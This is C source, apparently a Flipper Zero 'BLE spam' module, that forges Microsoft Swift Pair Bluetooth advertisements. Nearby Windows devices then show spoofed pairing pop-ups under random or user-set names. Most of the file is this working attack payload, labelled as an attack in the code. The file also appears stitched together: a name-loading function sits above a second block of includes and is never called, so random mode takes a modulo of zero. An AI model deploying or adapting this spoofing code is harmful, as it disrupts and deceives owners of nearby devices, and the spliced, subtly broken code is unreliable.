#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_NAMES 100 // Maximum number of names to read
#define MAX_NAME_LENGTH 50 // Maximum length of each name

// Function to read names from a file
static int readNamesFromFile(const char* filename, const char* names[], int* names_count) {
    FILE* file = fopen(filename, "r");
    if (file == NULL) {
        printf("Error opening the file.\n");
        return 1;
    }

    int count = 0;
    char line[MAX_NAME_LENGTH];

    while (fgets(line, sizeof(line), file) && count < MAX_NAMES) {
        line[strcspn(line, "\n")] = 0; // Removing the newline character if present
        names[count] = strdup(line); // Store the name in the array
        count++;
    }

    fclose(file);
    *names_count = count;
    return 0;
}

#include "swiftpair.h"
#include "_protocols.h"

const char* names[MAX_NAMES];
int names_count = 0;

static const char* get_name(const Payload* payload) {
    UNUSED(payload);
    return "SwiftPair";
}

static void make_packet(uint8_t* _size, uint8_t** _packet, Payload* payload) {
    SwiftpairCfg* cfg = payload ? &payload->cfg.swiftpair : NULL;

    const char* name;
    switch (cfg ? payload->mode : PayloadModeRandom) {
        case PayloadModeRandom:
        default:
            name = names[rand() % names_count];
            break;
        case PayloadModeValue:
            name = cfg->name;
            break;
    }
    uint8_t name_len = strlen(name);

    uint8_t size = 7 + name_len;
    uint8_t* packet = (uint8_t*)malloc(size);
    uint8_t i = 0;

    packet[i++] = size - 1; // Size
    packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
    packet[i++] = 0x06; // Company ID (Microsoft)
    packet[i++] = 0x00; // ...
    packet[i++] = 0x03; // Microsoft Beacon ID
    packet[i++] = 0x00; // Microsoft Beacon Sub Scenario
    packet[i++] = 0x80; // Reserved RSSI Byte
    memcpy(&packet[i], name, name_len);
    i += name_len;

    *_size = size;
    *_packet = packet;
}

enum {
    _ConfigExtraStart = ConfigExtraStart,
    ConfigName,
    ConfigInfoRequire,
    ConfigCOUNT,
};
static void config_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    scene_manager_set_scene_state(ctx->scene_manager, SceneConfig, index);
    switch(index) {
    case ConfigName:
        scene_manager_next_scene(ctx->scene_manager, SceneSwiftpairName);
        break;
    case ConfigInfoRequire:
        break;
    default:
        ctx->fallback_config_enter(ctx, index);
        break;
    }
}
static void extra_config(Ctx* ctx) {
    Payload* payload = &ctx->attack->payload;
    SwiftpairCfg* cfg = &payload->cfg.swiftpair;
    VariableItemList* list = ctx->variable_item_list;
    VariableItem* item;

    item = variable_item_list_add(list, "Display Name", 0, NULL, NULL);
    variable_item_set_current_value_text(
        item, payload->mode == PayloadModeRandom ? "Random" : cfg->name);

    variable_item_list_add(list, "Requires enabling SwiftPair", 0, NULL, NULL);

    variable_item_list_set_enter_callback(list, config_callback, ctx);
}

static uint8_t config_count(const Payload* payload) {
    UNUSED(payload);
    return ConfigCOUNT - ConfigExtraStart - 1;
}

const Protocol protocol_swiftpair = {
    .icon = &I_windows,
    .get_name = get_name,
    .make_packet = make_packet,
    .extra_config = extra_config,
    .config_count = config_count,
};

static void name_callback(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    payload->mode = PayloadModeValue;
    scene_manager_previous_scene(ctx->scene_manager);
}
void scene_swiftpair_name_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    SwiftpairCfg* cfg = &payload->cfg.swiftpair;
    TextInput* text_input = ctx->text_input;
    text_input_reset(text_input);

    text_input_set_header_text(text_input, "Press back for random");

    text_input_set_result_callback(
        text_input, name_callback, ctx, cfg->name, sizeof(cfg->name), true);

    text_input_set_minimum_length(text_input, 0);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewTextInput);
}
bool scene_swiftpair_name_on_event(void* _ctx, SceneManagerEvent event) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    if(event.type == SceneManagerEventTypeBack) {
        payload->mode = PayloadModeRandom;
    }
    return false;
}
void scene_swiftpair_name_on_exit(void* _ctx) {
    UNUSED(_ctx);
}
